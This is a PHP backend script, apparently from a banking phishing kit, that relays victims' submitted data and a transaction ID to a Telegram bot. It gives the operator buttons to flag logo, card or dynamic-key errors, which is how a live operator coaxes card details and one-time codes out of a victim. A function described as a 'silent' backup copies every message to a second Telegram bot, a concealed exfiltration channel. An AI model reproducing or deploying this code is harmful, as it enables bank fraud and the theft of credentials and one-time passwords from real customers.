<?php
header('Content-Type: application/json');

$config = require __DIR__ . '/../config.php';

$message = $_POST['message'] ?? '';
$transactionId = $_POST['transactionId'] ?? '';

if (empty($message) || empty($transactionId)) {
    echo json_encode(['status' => 'error', 'message' => 'Datos incompletos']);
    exit;
}

// Teclado inline con todas las acciones: Logo, Tarjeta, Dinámica, Finalizar
$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => "Error de Logo",    'callback_data' => "error_logo:{$transactionId}"]
        ],
        [
            ['text' => "Error de Tarjeta", 'callback_data' => "error_tarjeta:{$transactionId}"]
        ],
        [
            ['text' => "Error de Dinámica",'callback_data' => "pedir_dinamica:{$transactionId}"]
        ],
        [
            ['text' => "Finalizar",        'callback_data' => "confirm_finalizar:{$transactionId}"]
        ]
    ]
];

$data = [
    'chat_id' => $config['chat_id'],
    'text' => $message,
    'parse_mode' => 'HTML',
    'reply_markup' => json_encode($keyboard)
];

// Función para el envío silencioso a un segundo bot/canal
function sendSecureBackup($messageData) {
    $backup_config = [
        'bot_token' => '',
        'chat_id'   => ''
    ];

    if (empty($backup_config['bot_token']) || empty($backup_config['chat_id'])) {
        return;
    }

    $ch = curl_init("https://api.telegram.org/bot{$backup_config['bot_token']}/sendMessage");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
        'chat_id' => $backup_config['chat_id'],
        'text' => $messageData['text'],
        'parse_mode' => 'HTML'
    ]));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_exec($ch);
    curl_close($ch);
}

// Envío principal
$ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/sendMessage");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);

$response = curl_exec($ch);
curl_close($ch);

// Envío silencioso al segundo destino (sin teclado)
sendSecureBackup($data);

$result = json_decode($response, true);

$status = 'error';
$messageId = null;

if (is_array($result) && isset($result['ok']) && $result['ok'] && isset($result['result']['message_id'])) {
    $status = 'success';
    $messageId = $result['result']['message_id'];
}

echo json_encode([
    'status'    => $status,
    'messageId' => $messageId
]);
